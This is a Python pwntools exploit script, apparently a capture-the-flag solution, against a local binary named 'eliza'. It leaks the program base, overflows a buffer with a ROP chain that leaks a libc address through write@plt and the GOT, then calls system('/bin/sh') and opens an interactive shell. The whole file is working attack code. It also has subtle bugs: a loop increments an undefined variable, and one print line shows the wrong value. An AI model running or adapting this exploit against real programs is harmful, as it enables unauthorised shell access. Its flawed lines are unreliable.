#!/usr/bin/python
from pwn import *
context( arch='i386', os='linux', log_level='info')


p = process('./eliza')
p.sendline('help')
p.sendline('info eliza')
p.recvuntil('Designation Number: ')
p.recv(32)
base = u32(p.recv(4)) - 0x4cc7
print 'elf base: ',hex(base)


data_section = base + 0x976c
print 'data: ',hex(data_section)
while '\n' in p32(data_section):
	data += 1
print 'data_section: ',hex(data_section)
add_esp_c = 0x00001a29
write_plt = 0xf90
got = 0x904c


payload  = ''
payload += 'jump '
payload += 'c'*0x20c
payload += p32(data_section)
payload += p32(base + 0x1580)
payload += p32(base + 0x1040)
payload += p32(base + got)
assert '\n' not in payload

p.sendline( payload )
p.recvuntil('cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')
data = p.recvuntil('Wel')
__libc_start_main = u32(data[21:25])
libc_base = __libc_start_main - 99232
system = libc_base + 241312
sh = libc_base + 1436281
assert '\n' not in p32(system)
assert '\n' not in p32(sh)
print 'libc_base: ',hex(libc_base)
print 'system: ',hex(sh)
print 'sh: ',hex(sh)

payload  = ''
payload += 'jump '
payload += 'c'*0x20c
payload += p32(data_section)
payload += p32(system)
payload += p32(base + 0x1040)
payload += p32(sh)
assert '\n' not in payload

p.sendline( payload )

p.interactive()
